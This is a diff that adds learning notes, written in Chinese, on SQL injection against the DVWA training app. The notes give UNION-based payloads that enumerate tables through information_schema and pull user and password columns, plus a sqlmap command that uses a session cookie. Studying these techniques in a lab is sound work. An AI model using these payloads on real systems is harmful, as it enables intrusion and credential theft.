@@ -39,5 +39,15 @@ google hacking符号
 域名的区分
 一级域名也叫顶级域名（机构类）:.com .org .net  (地区名也属于顶级域名).cn .jp
 二级域名：baidx.com 等  三级域名=主机名www.baixi.conm等
-sql注入漏洞
+sql注入漏洞”#“注释sql后续的语句，select from where 从-中- 查询-为-
+1.判断列数 order by[column_num]
+2.联合查询其他信息 union select [sql1][sql2]如1'union select user(),database()#  user()当前数据库的连结用户 database()当前数据库的名称
+3.联合查询表1' union select table_name,table_schema from information_schema.tables  where  table_schema ='dvwa' #
+从information_schema数据库中查询dvwa数据库表
+4.联合查询信息union[query_sql] 如1'union select user,password from users#
+DVWAsqlmap简化利用工具如sqlmap.py
+第一步检测漏洞
+如 python sqlmap.py -u "url#" --cookie=""
+-u:url的地址，需要啊检测的网址
+--cookie：因为dvwa登入，在浏览器控制台里查看请求消息头获取cookie
 
